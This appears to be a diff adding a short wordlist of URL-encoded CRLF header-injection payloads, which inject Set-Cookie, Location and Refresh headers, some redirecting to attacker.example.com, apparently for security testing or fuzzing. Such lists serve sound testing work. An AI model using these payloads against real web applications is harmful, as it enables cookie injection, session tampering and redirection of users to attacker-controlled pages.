@@ -1,0 +1,14 @@
+%0d%0aX-Injected-Header: 1
+%0d%0aX-Injected-Header: injected
+%0d%0aX-Injected-Header: 1%0d%0aX-Another-Header: 2
+%0d%0aSet-Cookie: injected=1
+%0d%0aSet-Cookie: injected=1; Path=/
+%0d%0aLocation: https://attacker.example.com/
+%0d%0aRefresh: 0;url=https://attacker.example.com/
+%0aX-Injected-Header: 1
+%0aX-Injected-Header: injected%0aX-Another: 2
+%0dX-Injected-Header: 1
+%0dX-Injected-Header: injected%0dX-Another: 2
+%0d%0aX-Injected-Header:%20AttackValue
+%0d%0aX-Injected-Header: 1%0d%0aContent-Security-Policy: default-src 'none'
+%0d%0aX-Injected-Header: 1%0d%0aX-Frame-Options: DENY
